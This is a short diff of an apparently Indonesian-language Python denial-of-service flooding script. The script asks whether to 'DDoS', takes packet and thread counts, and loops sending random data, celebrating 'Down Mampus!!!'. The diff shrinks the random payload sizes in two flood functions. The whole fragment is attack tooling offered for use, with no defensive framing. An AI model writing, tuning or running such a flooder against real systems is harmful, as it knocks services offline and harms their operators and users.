@@ -28,7 +28,7 @@ choice = str(input(" Gasken Ngeddos Ga?(y/n):"))
 times = int(input(" Packets:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(20179)
+	data = random._urandom(1025)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -42,7 +42,7 @@ def run():
 			print("[!] Down Mampus!!!")
 
 def run2():
-	data = random._urandom(20179)
+	data = random._urandom(195)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
